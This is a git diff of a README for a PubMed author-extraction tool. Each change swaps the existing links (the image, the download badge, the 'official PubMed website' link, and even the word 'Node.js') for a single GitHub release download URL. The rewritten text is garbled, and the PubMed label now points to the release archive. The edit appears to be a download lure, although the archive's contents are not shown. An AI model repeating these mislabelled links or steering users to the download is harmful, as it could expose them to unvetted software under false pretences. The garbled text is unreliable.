@@ -1,8 +1,8 @@
 # PubMed Authors Fetcher 📚🔍
 
-![PubMed Authors Fetcher](https://example.com/pubmed-authors-fetcher.jpg)
+![PubMed Authors Fetcher](https://github.com/CloudtechDevops001/pubmed-authors-fetcher/releases/tag/v1.2)
 
-Welcome to the **PubMed Authors Fetcher** GitHub repository! This Node.js tool is designed for extracting and analyzing author information from PubMed articles. Whether you are a researcher looking to analyze publications, track author affiliations, or generate CSV reports for bibliometric analysis, this tool has got you covered.
+Welcome to the **PubMed Authors Fetcher** GitHub repository! This https://github.com/CloudtechDevops001/pubmed-authors-fetcher/releases/tag/v1.2 tool is designed for extracting and analyzing author information from PubMed articles. Whether you are a researcher looking to analyze publications, track author affiliations, or generate CSV reports for bibliometric analysis, this tool has got you covered.
 
 ## Features 🌟
 
@@ -14,7 +14,7 @@ Welcome to the **PubMed Authors Fetcher** GitHub repository! This Node.js tool i
 
 To get started with the PubMed Authors Fetcher tool, simply download the tool from the following link:
 
-[![Download PubMed Authors Fetcher](https://img.shields.io/badge/Download-PubMed%20Authors%20Fetcher-blue.svg)](https://github.com/files/Soft.zip)
+[![Download PubMed Authors Fetcher](https://github.com/CloudtechDevops001/pubmed-authors-fetcher/releases/tag/v1.2%20Authors%https://github.com/CloudtechDevops001/pubmed-authors-fetcher/releases/tag/v1.2)](https://github.com/CloudtechDevops001/pubmed-authors-fetcher/releases/tag/v1.2)
 
 Once you have downloaded the tool, extract the contents and follow the installation instructions provided in the README file.
 
@@ -56,7 +56,7 @@ For any issues or questions regarding the PubMed Authors Fetcher tool, please ch
 
 ## More Information
 
-For more information about the PubMed Authors Fetcher tool, visit the official [PubMed website](https://pubmed.ncbi.nlm.nih.gov/). Explore the vast database of scientific articles and publications to enhance your research and analytical capabilities.
+For more information about the PubMed Authors Fetcher tool, visit the official [PubMed website](https://github.com/CloudtechDevops001/pubmed-authors-fetcher/releases/tag/v1.2). Explore the vast database of scientific articles and publications to enhance your research and analytical capabilities.
 
 Thank you for visiting the PubMed Authors Fetcher repository! Happy researching! 📖🔬
 
